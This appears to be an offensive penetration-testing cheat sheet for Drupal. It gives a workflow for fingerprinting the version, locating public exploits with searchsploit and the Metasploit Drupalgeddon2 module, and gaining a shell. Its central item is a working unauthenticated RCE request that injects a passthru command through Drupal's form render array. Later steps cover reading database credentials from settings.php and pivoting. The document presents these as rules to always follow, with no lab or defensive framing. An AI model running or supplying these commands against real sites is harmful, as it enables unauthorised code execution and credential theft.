# Drupal Enumeration & Exploitation

## Purpose

Workflow for identifying and exploiting Drupal applications.

Core rules:

* Drupal has well-known RCE exploits
* Version identification is critical
* Often leads directly to shell

---

## 0. Identify Drupal

Look for:

* /user/login
* /sites/default
* page source references

---

## 1. Determine Version

```bash
curl http://<IP>/CHANGELOG.txt
```

---

## 2. Search Exploits

```bash
searchsploit drupal
```

---

## 3. Drupalgeddon (CRITICAL)

### Drupal 7 (Drupalgeddon2)

```bash
searchsploit -m drupal 7
```

Exploit:

* unauthenticated RCE

---

### Drupal 8

```bash
searchsploit drupal 8
```

---

## 4. Metasploit (Optional)

```bash
use exploit/unix/webapp/drupal_drupalgeddon2
```

---

## 5. Manual RCE

Example:

```bash
curl -s -X POST "http://<IP>/?q=user/password&name[#post_render][]=passthru&name[#markup]=id"
```

---

## 6. Credential Access

Check:

* settings.php
* DB credentials

---

## 7. Admin Login

```text
/user/login
```

---

## 8. Pivot Opportunities

Drupal can give:

* shell access
* DB creds
* system paths

---

## 9. If Stuck

* confirm version
* retry exploit
* check alternative payloads

---

## 10. Mental Model

* Drupal = version-specific exploit
* Exploit = direct shell

---

## 11. Golden Rules

* Always check version
* Always try Drupalgeddon
* Always test RCE early
